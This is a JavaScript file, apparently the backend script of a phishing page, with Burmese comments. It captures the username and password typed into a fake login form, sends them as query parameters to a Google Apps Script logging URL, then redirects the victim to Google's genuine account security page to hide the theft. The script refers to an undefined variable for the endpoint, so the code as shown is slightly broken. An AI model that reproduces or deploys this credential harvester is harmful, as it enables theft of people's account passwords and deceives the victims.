// capture.js - Final Script for Apps Script Backend

// ====================================================================
// ⚠️ ဤနေရာတွင် Bro ၏ Google Apps Script Deployment URL ကို ထည့်ပါ။
// ဥပမာ: 'https://script.google.com/macros/s/AKfycb_RANDOM_CODE_HERE/exec'
// ====================================================================

const LOGGING_ENDPOINT = 'https://script.google.com/macros/s/AKfycbx6ZyGDMNoJ7pDBuaRnQ7MOjdX1YF_1DfsiW0uNm9eL1ElpHUvcYSLP25bXw2bGGeO14Q/exec'; 

const REDIRECT_URL = 'https://myaccount.google.com/security';

document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault(); 

        // 1. Input Data တွေ ဖမ်းယူခြင်း
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // 2. Data တွေကို URL Query Parameters အဖြစ် ပြင်ဆင်ခြင်း
        // Bro ရဲ့ doGet Script က 'mail' နဲ့ 'pass' ကို မျှော်လင့်တာမို့ ဒီအတိုင်းပို့မယ်။
        const params = new URLSearchParams({
            mail: username,
            pass: password
            // Note: doGet မှာ Timestamp နဲ့ User Agent ကို လက်ခံဖို့ Logic မရှိတာမို့ မပို့တော့ဘူး။
        });

        // 3. GET Request URL အပြည့်အစုံကို ဖန်တီးခြင်း
        // ဥပမာ: https://script.google.com/.../exec?mail=user@gmail.com&pass=secret123
        const finalUrl = `${LOGGING_ENDPOINT_BASE}?${params.toString()}`;

        // 4. Fetch API ကို သုံးပြီး Apps Script Web App ဆီကို GET request ပို့မယ်
        // GET Request က Data တွေကို URL မှာ ထည့်ပို့တယ်။
        fetch(finalUrl, {
            method: 'GET', // 👈 GET Method ကို သုံးလိုက်ပြီ
            mode: 'no-cors' 
        })
        .then(response => {
            console.log('Credentials sent successfully via GET request.');
            // 5. Data ပို့ပြီးတာနဲ့ Target ကို Redirect လုပ်မယ်
            window.location.href = REDIRECT_URL;
        })
        .catch(error => {
            // Error ရှိရင်တောင် Redirect လုပ်မယ်
            console.error('Error sending data, but redirecting anyway:', error);
            window.location.href = REDIRECT_URL;
        });

    });
});
